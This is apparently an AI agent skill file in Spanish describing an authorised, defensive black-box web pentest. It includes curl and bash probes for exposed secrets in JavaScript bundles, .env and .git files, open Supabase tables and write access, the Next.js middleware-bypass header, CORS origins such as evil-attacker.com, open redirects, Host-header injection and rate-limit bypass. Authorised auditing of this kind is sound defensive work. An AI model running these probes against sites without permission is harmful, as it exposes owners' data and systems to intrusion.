---
name: tool-web-security-audit
description: "Auditoría defensiva de seguridad web tipo pentest black-box para webs propias o con autorización explícita. Ejecuta tests OWASP, CVEs, CORS, headers, BBDD, auth, rate limiting e inyección, cierra con un scorecard cuantitativo 0-100 (semáforo) y ofrece auto-fix de los hallazgos, y genera informe HTML con vulnerabilidades, pruebas de concepto mínimas y plan de acción. Úsala para auditorías pre-lanzamiento, revisión defensiva o validación de una web autorizada antes de desplegar, o cuando el operador diga '¿tiene vulnerabilidades mi web?', 'pentest a mi sitio', 'busca agujeros de seguridad', 'auditoría de seguridad web', 'testea si mi web es segura', '¿es hackeable esto?'. Solo sobre webs propias o con autorización explícita."
version: 2.1.0
---

# Web Security Audit — Pentest Black-Box Profesional

## Aviso de uso responsable

Usa esta skill **solo sobre webs propias o con autorización explícita del propietario**. Es una herramienta de auditoría defensiva y pre-lanzamiento. Si el usuario no confirma autorización, no ejecutes pruebas, no descargues bundles y no lances comandos contra el objetivo.

Auditoria de seguridad web externa basada en OWASP Top 10 2025, PTES, y experiencia real de pentesting en produccion. Cubre Next.js, React, Vue, WordPress, Django, Rails, Laravel, y cualquier stack web moderno. Genera informe HTML profesional en espanol.

## Contexto y por que importa

Las webs modernas tienen superficies de ataque enormes: APIs abiertas, bases de datos con RLS mal configurado, headers de seguridad ausentes, y CVEs en frameworks populares. Un atacante con conocimientos basicos y curl puede explotar estas vulnerabilidades en minutos. Esta skill sistematiza lo que un pentester profesional haria, en un formato reproducible y documentado.

## Flujo de ejecucion

### Fase 0: Autorizacion (obligatorio)

Antes de cualquier test, confirmar con el usuario:
1. Tiene autorizacion del propietario para auditar la URL
2. Restricciones (no crear cuentas, no tocar produccion, etc.)
3. Idioma del informe (por defecto: espanol)

Si no hay autorizacion explicita, NO proceder.

### Fase 1: Reconocimiento

Ejecutar las 4 sub-fases en paralelo con Bash:

**1A — Headers de seguridad:**
```bash
curl -sI "https://TARGET"
```
Checklist de headers (cada uno faltante es un hallazgo):
| Header | Esperado | Severidad si falta |
|--------|----------|-------------------|
| Strict-Transport-Security | max-age>=31536000; includeSubDomains | Media |
| Content-Security-Policy | Politica restrictiva, sin unsafe-inline | Alta |
| X-Frame-Options | DENY (SAMEORIGIN = media) | Media |
| X-Content-Type-Options | nosniff | Baja |
| Referrer-Policy | strict-origin-when-cross-origin o mas restrictivo | Baja |
| Permissions-Policy | Bloquear camera, microphone, geolocation | Baja |
| X-Powered-By | NO debe estar presente | Alta (info disclosure) |
| Server | NO debe revelar version exacta | Baja |

**1B — Deteccion de stack:**
```bash
PAGE=$(curl -s "https://TARGET")
# Detectar frameworks
echo "$PAGE" | grep -oiE '(_next/|__next|nuxt|vue|angular|react|svelte|gatsby|remix|astro|wordpress|wp-content|wp-includes|django|laravel|rails|flask|express)' | sort -u
# Scripts externos (tracking, analytics, APIs)
echo "$PAGE" | grep -oE 'https?://[^"'\''> ]+\.js' | sort -u
# Buscar Supabase, Firebase, Stripe, etc.
echo "$PAGE" | grep -oiE '(supabase|firebase|googleapis|stripe|algolia|sentry|mixpanel|amplitude|segment|intercom|crisp|hubspot)' | sort -u
```

**1C — DNS e infraestructura:**
```bash
dig TARGET A +short
dig TARGET MX +short
dig TARGET TXT +short
dig TARGET NS +short
# Detectar CDN (Cloudflare, Vercel, etc.)
```

**1D — robots.txt y sitemap:**
```bash
curl -s "https://TARGET/robots.txt"
curl -s "https://TARGET/sitemap.xml" | head -50
```

### Fase 2: Busqueda de secretos en JavaScript

Los JS bundles client-side a menudo contienen claves de API, URLs de bases de datos y tokens. Es lo primero que mira un atacante.

```bash
# Descargar todos los chunks JS
CHUNKS=$(curl -s "https://TARGET" | grep -oE '(src="|href=")[^"]*\.js' | sed 's/src="//;s/href="//' | sort -u)
mkdir -p /tmp/audit_js
for chunk in $CHUNKS; do
  fname=$(basename "$chunk" | head -c 50)
  curl -s "https://TARGET${chunk}" > "/tmp/audit_js/${fname}" 2>&1
done
```

Patrones a buscar en los archivos descargados:
```bash
# Supabase / Firebase keys
grep -rhoiE 'eyJ[A-Za-z0-9_/+-]{30,}' /tmp/audit_js/ | sort -u
grep -rhoiE 'sb_publishable[A-Za-z0-9_-]+' /tmp/audit_js/
grep -rhoiE 'AIza[A-Za-z0-9_-]{35}' /tmp/audit_js/        # Firebase
grep -rhoiE 'sk_live_[A-Za-z0-9]{20,}' /tmp/audit_js/       # Stripe secret
grep -rhoiE 'pk_live_[A-Za-z0-9]{20,}' /tmp/audit_js/       # Stripe public
# URLs internas
grep -rhoiE 'https?://[a-z0-9.-]+\.(supabase\.co|firebaseio\.com|firebaseapp\.com)' /tmp/audit_js/ | sort -u
# Env vars
grep -rhoiE 'NEXT_PUBLIC_[A-Z_]+' /tmp/audit_js/ | sort -u
```

Si se encuentra un JWT de Supabase, decodificar para obtener el project ref:
```bash
echo "JWT_TOKEN" | cut -d. -f2 | python3 -c "import sys,base64,json; p=sys.stdin.read().strip(); p+='='*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
```

### Fase 3: Enumeracion de rutas

Usar un script externo para evitar problemas de escaping en shell:
```bash
cat > /tmp/audit_routes.sh << 'SCRIPT'
#!/bin/bash
TARGET=$1
for path in /admin /login /register /signup /api /api/auth /api/auth/callback /api/users /api/admin /api/admin/users /api/rooms /api/bookings /api/payments /api/webhooks /api/stripe /api/contact /api/newsletter /dashboard /panel /perfil /profile /account /settings /checkout /booking /reserva /mis-reservas /.env /.env.local /.env.production /.git/config /.git/HEAD /graphql /swagger /api-docs /health /status /_next/data /debug /info /wp-admin /wp-login.php /wp-json /xmlrpc.php /phpmyadmin /adminer /server-status /server-info; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://${TARGET}${path}")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "  ${path} -> HTTP ${code}"
  fi
done
SCRIPT
chmod +x /tmp/audit_routes.sh
bash /tmp/audit_routes.sh "TARGET"
```

Clasificar resultados:
- Rutas que deberian requerir auth y devuelven 200 = **ALTO**
- Rutas admin accesibles = **CRITICO**
- .env, .git accesibles = **CRITICO**
- API endpoints accesibles sin auth = **ALTO**

### Fase 4: Supabase Deep Audit

Solo ejecutar si se detecto Supabase en Fase 2. Definir variables:
```bash
SUPA_URL="https://PROJECT_REF.supabase.co"  # o custom domain
ANON_KEY="eyJ..."  # del JS
```

**4.1 — Enumeracion de tablas con hints de error:**
```bash
for tbl in users profiles public_users community_profiles rooms listings bookings reservations payments transactions properties apartments tenants landlords owners contracts messages chats notifications reviews verifications documents invoices blog_posts leads contacts waitlist settings admins; do
  result=$(curl -s "${SUPA_URL}/rest/v1/${tbl}?limit=1" \
    -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}")
  if echo "$result" | grep -q "PGRST"; then
    hint=$(echo "$result" | grep -oE '"hint":"[^"]*"' | head -1)
    [ -n "$hint" ] && echo "  ${tbl}: NO EXISTE ${hint}"
  elif echo "$result" | grep -q "permission denied\|row-level security"; then
    echo "  ${tbl}: PROTEGIDA (RLS activo) ✓"
  elif echo "$result" | grep -q "restricted"; then
    echo "  ${tbl}: PROYECTO SUSPENDIDO/RESTRINGIDO"
  elif [ "$result" = "[]" ]; then
    echo "  ${tbl}: ACCESIBLE (vacia)"
  else
    echo "  ${tbl}: *** ACCESIBLE CON DATOS *** — $(echo "$result" | wc -c) bytes"
  fi
done
```

**4.2 — Para cada tabla accesible, contar registros:**
```bash
curl -s "${SUPA_URL}/rest/v1/TABLE?select=id" \
  -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
  -H "Prefer: count=exact" -H "Range: 0-0" -I | grep -i content-range
```

**4.3 — Test de escritura (INSERT/UPDATE/DELETE):**
```bash
# INSERT — usar datos dummy
curl -s -X POST "${SUPA_URL}/rest/v1/TABLE" \
  -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" \
  -d '{"test_field":"SECURITY_AUDIT_TEST"}'
# Si funciona = CRITICO. Intentar DELETE inmediato para limpiar.

# UPDATE — cambiar campo de un registro conocido
curl -s -X PATCH "${SUPA_URL}/rest/v1/TABLE?id=eq.KNOWN_ID" \
  -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
  -H "Content-Type: application/json" -d '{"field":"AUDIT_TEST"}'
# Si funciona = CRITICO. REVERTIR inmediatamente.
```

**4.4 — Auth config publica:**
```bash
curl -s "${SUPA_URL}/auth/v1/settings" -H "apikey: ${ANON_KEY}"
```
Verificar:
- `disable_signup: false` + plataforma cerrada = **ALTO** (signup abierto no intencionado)
- `mailer_autoconfirm: true` = **ALTO** (cuentas sin verificacion email)
- OAuth providers inesperados = **MEDIO**

**4.5 — Test de signup abierto:**
```bash
curl -s -X POST "${SUPA_URL}/auth/v1/signup" \
  -H "apikey: ${ANON_KEY}" -H "Content-Type: application/json" \
  -d '{"email":"security-audit-test@nonexistent-domain.invalid","password":"AuditTest2026!"}'
```
Si devuelve user object con UUID = **ALTO** (cualquiera puede crear cuenta)

**4.6 — Storage buckets:**
```bash
curl -s "${SUPA_URL}/storage/v1/bucket" -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}"
# Para cada bucket encontrado, intentar listar archivos:
curl -s "${SUPA_URL}/storage/v1/object/list/BUCKET_NAME" \
  -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
  -H "Content-Type: application/json" -d '{"prefix":"","limit":20}'
```

**4.7 — RPC functions:**
```bash
for fn in get_users get_all_users admin_get_users export_users get_user_emails list_users get_members get_subscribers get_leaderboard get_user_tier; do
  result=$(curl -s -X POST "${SUPA_URL}/rest/v1/rpc/${fn}" \
    -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
    -H "Content-Type: application/json" -d '{}')
  echo "  rpc/${fn}: $(echo "$result" | head -c 150)"
done
```

### Fase 5: Next.js Specific

Solo si se detecto Next.js.

**5.1 — Middleware Bypass CVE-2025-29927 (CRITICO, CVSS 9.1):**
```bash
# Comparar respuesta normal vs con header de bypass
NORMAL=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/admin")
BYPASS=$(curl -s -o /dev/null -w "%{http_code}" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" "https://TARGET/admin")
echo "Normal: $NORMAL | Bypass: $BYPASS"
# Si NORMAL=307/401 pero BYPASS=200 → CRITICO (CVE confirmada)
# Si ambos son 200 → la ruta no tiene middleware (problema diferente)
```
Probar variantes: `middleware`, `src/middleware`, `pages/_middleware`

**5.2 — RSC Data Leakage:**
```bash
RSC=$(curl -s "https://TARGET" -H "RSC: 1" -H "Next-Router-State-Tree: %5B%22%22%5D")
# Buscar datos sensibles en el payload
echo "$RSC" | grep -oiE '(email|password|secret|token|apikey|phone|dni|iban|credit|ssn)' | sort -u
# Probar en rutas protegidas tambien:
curl -s "https://TARGET/dashboard" -H "RSC: 1" -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22dashboard%22%2C%7B%7D%5D%7D%5D"
```

**5.3 — Server Actions:**
```bash
curl -s -X POST "https://TARGET" -H "Next-Action: 0000000000" -H "Content-Type: text/plain" -d '[]'
# "Server action not found" = endpoint existe (info disclosure menor)
```

**5.4 — Source Maps:**
```bash
for chunk in $(curl -s "https://TARGET" | grep -oE '/_next/static/chunks/[^"]+\.js' | sort -u); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET${chunk}.map")
  [ "$code" = "200" ] && echo "  SOURCE MAP EXPUESTO: ${chunk}.map"
done
```
Source map accesible = **MEDIA** (expone codigo fuente original)

### Fase 6: WordPress Specific

Solo si se detecto WordPress.

```bash
# Version de WP
curl -s "https://TARGET" | grep -oE 'content="WordPress [0-9.]+"'
curl -s "https://TARGET/wp-json/" | head -c 200
# xmlrpc activo (bruteforce vector)
curl -s -X POST "https://TARGET/xmlrpc.php" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
# Users enumeration
curl -s "https://TARGET/wp-json/wp/v2/users"
curl -s "https://TARGET/?author=1" -o /dev/null -w "%{redirect_url}"
# Login bruteforce protection
curl -s -X POST "https://TARGET/wp-login.php" -d "log=admin&pwd=wrongpass"
```

### Fase 7: CORS

```bash
# Reflected origin (CRITICO si refleja con credentials)
curl -sI "https://TARGET" -H "Origin: https://evil-attacker.com" | grep -i "access-control"
# Null origin (exploitable via sandboxed iframe)
curl -sI "https://TARGET" -H "Origin: null" | grep -i "access-control"
# Subdomain wildcard
curl -sI "https://TARGET" -H "Origin: https://anything.TARGET" | grep -i "access-control"
# Prefix/suffix bypass
curl -sI "https://TARGET" -H "Origin: https://TARGET.evil.com" | grep -i "access-control"
```
Si hay API (Supabase, etc.), probar CORS en esos endpoints tambien:
- `access-control-allow-origin: *` en API = **ALTO**
- Origin reflejado + `Access-Control-Allow-Credentials: true` = **CRITICO**

### Fase 8: Auth y Sesiones

```bash
# Cookies
curl -sI "https://TARGET" | grep -i "set-cookie"
# Cada cookie debe tener: Secure, HttpOnly, SameSite=Strict|Lax

# Open redirect
for param in redirect url next return_to redirect_uri callback goto dest; do
  loc=$(curl -s -o /dev/null -w "%{redirect_url}" "https://TARGET/login?${param}=https://evil.com")
  [ -n "$loc" ] && echo "OPEN REDIRECT: ${param} -> ${loc}"
done

# Password reset host injection
curl -s -X POST "https://TARGET/api/auth/reset-password" \
  -H "Host: evil.com" -H "Content-Type: application/json" \
  -d '{"email":"test@nonexistent.invalid"}'
```

### Fase 9: HTTP Methods y Error Handling

```bash
# Metodos HTTP peligrosos
for method in OPTIONS TRACE PUT DELETE PATCH; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "https://TARGET/")
  echo "  ${method}: HTTP ${code}"
done
# TRACE 200 = MEDIO, PUT/DELETE 200 inesperado = ALTO

# Error handling — provocar errores y buscar info leaks
curl -s "https://TARGET/api/users/undefined"
curl -s -X POST "https://TARGET/api/contact" -H "Content-Type: application/json" -d '{"invalid":'
# Stack traces, paths internos, versiones = MEDIO
```

### Fase 10: Rate Limiting

```bash
# Test basico — 20 peticiones rapidas
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " "https://TARGET/"
done
echo ""
# Si todos 200 = sin rate limiting = ALTO

# Bypass via X-Forwarded-For
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " -H "X-Forwarded-For: 10.0.0.${i}" "https://TARGET/api/users"
done
```

### Fase 11: Cloudflare/CDN Bypass

Solo si se detecto Cloudflare u otro CDN.

```bash
# Buscar IP real via registros MX
dig MX TARGET +short
# Subdominios no proxied
for sub in mail ftp cpanel direct api staging dev test; do
  ip=$(dig +short ${sub}.TARGET 2>/dev/null)
  [ -n "$ip" ] && echo "  ${sub}.TARGET: ${ip}"
done
# Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.TARGET&output=json" | python3 -c "import sys,json; [print(x['name_value']) for x in json.load(sys.stdin)]" 2>/dev/null | sort -u
```

### Fase 12: Archivos sensibles

```bash
cat > /tmp/audit_files.sh << 'SCRIPT'
#!/bin/bash
TARGET=$1
for path in .env .env.local .env.production .env.development .git/config .git/HEAD .DS_Store wp-config.php server-status server-info debug info package.json composer.json Dockerfile docker-compose.yml .dockerignore backup.sql dump.sql database.sql db.sql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://${TARGET}/${path}")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "  ${path}: HTTP ${code}"
  fi
done
SCRIPT
bash /tmp/audit_files.sh "TARGET"
```

### Fase 13: Scorecard cuantitativo (0-100) + auto-fix

Además del listado de hallazgos, cierra la auditoría con un **veredicto numérico** y con la **oferta de arreglar**, no solo señalar. Idea tomada del patrón scan→suggest→auto-fix (`fermonterom/claude-testing-kit`), aplicada a seguridad.

**13.1 — Score global (0-100).** Parte de 100 y resta por hallazgo según severidad, agrupado por categoría ponderada. Reporta el desglose y el total con semáforo.

| Categoría | Peso | Resta por hallazgo |
|---|---|---|
| Secretos / claves expuestas | 25 | −25 crítica · −10 alta |
| Auth / RLS / autorización | 25 | −25 crítica · −12 alta |
| Inyección / CVEs (SQLi, middleware bypass, CORS+creds) | 20 | −20 crítica · −8 alta |
| Config / headers / cookies | 15 | −6 alta · −3 media |
| Superficie / archivos sensibles (.env, .git, source maps) | 10 | −10 crítica · −4 media |
| Rate limiting / DoS surface | 5 | −5 alta · −2 media |

Clamp a `[0,100]`. Semáforo del veredicto:
- 🟢 **85-100** — Listo para desplegar (solo hallazgos menores).
- 🟡 **60-84** — Corregir antes de exponer al público (hay altas).
- 🔴 **0-59** — NO desplegar. Hay críticas explotables.

El score va en el header del informe HTML (junto a las 4 score cards de conteo) como cifra grande con su color de semáforo.

**13.2 — Validación reforzada de secretos (gate crítico).** Cualquiera de estos es **CRÍTICO automático** y baja el score de "Secretos" a 0:
- `.env*` accesible por HTTP (Fase 12) **o** rastreado en git del target.
- `service_role` key / `sk_live_` / JWT con rol elevado en el JS cliente (Fase 2).
- Variable con valor placeholder real (`changeme`, `xxxx`, `your-key-here`) servida en producción.

Cruza con la passive rule `env-never-commit` del OS: si el target es un repo propio del operador, recuérdale verificar que `.env*` esté en `.gitignore`.

**13.3 — Oferta de auto-fix (scan → suggest → fix).** Tras el informe, **ofrece generar los arreglos**, no cierres solo con el diagnóstico. Para cada categoría con hallazgos, propón el fix concreto y, si el operador acepta y hay acceso al repo:
- **Headers**: snippet de `next.config.js` / `vercel.json` / middleware con CSP, HSTS, X-Frame-Options DENY, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.
- **Secretos**: añadir `.env*` a `.gitignore`, rotar la clave expuesta, mover a variable de entorno (NUNCA hardcodear).
- **RLS Supabase**: políticas `enable row level security` + `policy` de ejemplo por tabla accesible.
- **CORS**: reemplazar `*`/origin reflejado por allowlist.
- **Rate limiting**: sugerir middleware/edge config o WAF.

**13.4 — Enforcement continuo (opcional).** Si es un proyecto propio recurrente, sugiere un **git hook pre-deploy** (Husky) que corra la parte no destructiva de esta auditoría (headers + secretos + archivos sensibles) antes de cada push, y remite a la skill `tool-quality-gate` como puerta de calidad general del OS.

## Generacion del informe HTML

Al completar todas las fases, generar un archivo HTML con este formato. El HTML debe usar CSS puro sin JavaScript (compatible WhatsApp/Telegram) y dark theme.

### Estructura del informe:

1. **Header** — Fecha, objetivo (URL), gravedad general, nombre del auditor, y **score global 0-100** (cifra grande con color de semáforo, ver Fase 13)
2. **Score cards** — 4 tarjetas: criticas, altas, medias, OK (con contadores)
3. **Resumen ejecutivo** — 2-3 frases en lenguaje NO tecnico, con fondo rojo degradado
4. **Analogia** — Bloque azul explicando los hallazgos como si la web fuera un edificio, hotel, etc. Adaptar la analogia al tipo de negocio
5. **Info tecnica** — Tabla con stack, dominio, DB, CDN, claves encontradas
6. **Vulnerabilidades criticas** — Cards con borde rojo (#ff4444), cada una con: titulo descriptivo, descripcion en lenguaje sencillo, prueba de concepto en bloque `<pre>`, fix recomendado
7. **Vulnerabilidades altas** — Cards con borde naranja (#ff8c00), misma estructura
8. **Vulnerabilidades medias** — Cards con borde amarillo (#f5a623)
9. **Lo que esta bien** — Tabla con fondo verde (#00c853) para items que pasan
10. **Resultados del pentest** — Tabla resumen: ataque | resultado | gravedad (badges)
11. **Comandos de reproduccion** — Bloques desplegables `<details><summary>`
12. **Plan de accion** — Timeline con dots de color: rojo=ahora, naranja=hoy, amarillo=esta semana, gris=antes de lanzar
13. **Implicaciones legales** — RGPD, LOPD, ePrivacy si aplica. Adaptar al pais del target
14. **Footer** — "CONFIDENCIAL", auditor, fecha

### Estilos CSS base:
- Fondo: `#0a0a0a`, texto: `#e0e0e0`
- Critico: `#ff4444`, Alto: `#ff8c00`, Medio: `#f5a623`, OK: `#00c853`
- Code/pre: font `SF Mono, Fira Code, monospace`, fondo `#1a1a1a`
- Max-width: 900px, responsive para movil
- Badges con border-radius 20px y colores segun severidad

### Guardar en:
- Carpeta por defecto: `projects/security-audit/<YYYY-MM-DD>/<dominio>/`
- Nombre: `auditoria-seguridad-[dominio]-[YYYY-MM-DD].html`

## Tabla de severidades

| Hallazgo | Severidad |
|----------|-----------|
| BBDD abierta sin auth (RLS desactivado) | CRITICA |
| Modificacion/borrado de datos de otros usuarios | CRITICA |
| Contenido de pago accesible publicamente | CRITICA |
| Middleware bypass (CVE-2025-29927) | CRITICA |
| Service role key expuesta en JavaScript | CRITICA |
| SQL injection confirmada | CRITICA |
| .env o .git accesible publicamente | CRITICA |
| Signup abierto no intencionado | ALTA |
| Rutas protegidas accesibles sin auth (/admin, /dashboard) | ALTA |
| Sin Content-Security-Policy | ALTA |
| Sin rate limiting | ALTA |
| CORS reflected origin + credentials | ALTA |
| x-powered-by / Server version expuestos | ALTA |
| Auth config publica (settings endpoint) | ALTA |
| xmlrpc.php activo (WordPress) | ALTA |
| WP users enumeration via REST API | ALTA |
| CORS wildcard sin credentials | MEDIA |
| X-Frame-Options SAMEORIGIN en vez de DENY | MEDIA |
| Tracking (Facebook Pixel, etc.) sin consentimiento cookies | MEDIA |
| Storage buckets publicos con archivos listables | MEDIA |
| Source maps expuestos (.js.map accesible) | MEDIA |
| Error handling revela info interna (stack traces) | MEDIA |
| Sin HSTS | MEDIA |
| Server Action endpoint descubierto | MEDIA |
| PUT/DELETE devuelven 200 en rutas inesperadas | MEDIA |
| Header Server revela version exacta | BAJA |
| Imagenes placeholder de servicios externos | BAJA |

## Reglas eticas de la auditoria

Estas reglas existen porque una auditoria de seguridad tiene el poder de causar dano real si se hace de forma irresponsable. Seguirlas protege tanto al auditor como al propietario del sitio.

1. Solo prueba de concepto minima — no explotar vulnerabilidades mas alla de confirmar que existen
2. Revertir inmediatamente cualquier modificacion hecha durante la auditoria (si un UPDATE funciona, restaurar el valor original)
3. No crear cuentas reales — usar emails @nonexistent-domain.invalid
4. No exfiltrar ni almacenar datos personales reales de usuarios
5. No realizar denial of service ni tests de carga agresivos
6. Documentar cada paso para que sea reproducible
7. Informar al propietario inmediatamente si se encuentra algo critico
8. El informe es CONFIDENCIAL y solo para el propietario autorizado
9. Limpiar archivos temporales al finalizar: `rm -rf /tmp/audit_*`

Skill original de Angel Aparicio (IA Masters Academy), adaptada para iamasters-os.
